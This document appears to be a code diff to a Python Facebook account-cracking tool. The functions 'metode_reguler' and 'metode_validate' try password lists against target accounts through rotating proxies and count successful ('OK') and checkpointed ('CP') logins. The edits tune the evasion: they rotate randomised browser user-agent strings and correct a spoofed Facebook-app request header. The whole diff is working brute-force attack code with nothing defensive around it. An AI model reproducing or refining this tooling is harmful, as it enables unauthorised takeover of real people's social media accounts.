@@ -102,7 +102,7 @@ for xd in range(10000):
 	x=random.choice(['UCBrowser/12.13.0.1207','OPR/64.3.3282.60839'])
 	l=random.choice(['Mobile Safari/537.36','Mobile Safari/E7FBAF'])
 	uaku2=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {x} {l}'
-	ugen.append(uaku2)
+	ugen2.append(uaku2)
 
 ###----------[ CHECK THEME COLOR ]---------- ###
 try:
@@ -404,10 +404,10 @@ def metode_reguler(user, pwx, url):
 	prox = open("data/proxy.txt","r").read().splitlines()
 	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
 	prog.advance(des)
-	redmi = open('data/mas.txt','r').read().splitlines()
-	ua = random.choice(redmi)
+	redmi = open('data/opra.txt','r').read().splitlines()
+	ua = random.choice(ugen2)
 	nokia = open('data/nokia1.txt','r').read().splitlines()
-	ua2 = random.choice(nokia)
+	ua2 = random.choice(ugen)
 	for pw in pwx:
 		try:
 			pw = pw.lower()
@@ -418,7 +418,7 @@ def metode_reguler(user, pwx, url):
 				"upgrade-insecure-requests":"1",
 				"user-agent":ua2,
 				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
-				"x-requested-with":"com.facebook.katana.",
+				"x-requested-with":"com.facebook.katana",
 				"sec-fetch-site":"same-origin",
 				"sec-fetch-mode":"cors",
 				"sec-fetch-user":"empty",
@@ -483,10 +483,10 @@ def metode_validate(user, pwx, url):
 	prox = open("data/proxy.txt","r").read().splitlines()
 	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
 	prog.advance(des)
-	redmi = open('data/mas.txt','r').read().splitlines()
-	ua = random.choice(redmi)
+	redmi = open('data/uc1.txt','r').read().splitlines()
+	ua = random.choice(ugen2)
 	nokia = open('data/nokia1.txt','r').read().splitlines()
-	ua2 = random.choice(nokia)
+	ua2 = random.choice(ugen2)
 	for pw in pwx:
 		try:
 			pw = pw.lower()
@@ -495,9 +495,9 @@ def metode_validate(user, pwx, url):
 			headers1= {
 				"Host":url,
 				"upgrade-insecure-requests":"1",
-				"user-agent":ua2,
+				"user-agent":ua,
 				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
-				"x-requested-with":"com.facebook.katana.",
+				"x-requested-with":"com.facebook.katana",
 				"sec-fetch-site":"same-origin",
 				"sec-fetch-mode":"cors",
 				"sec-fetch-user":"empty",
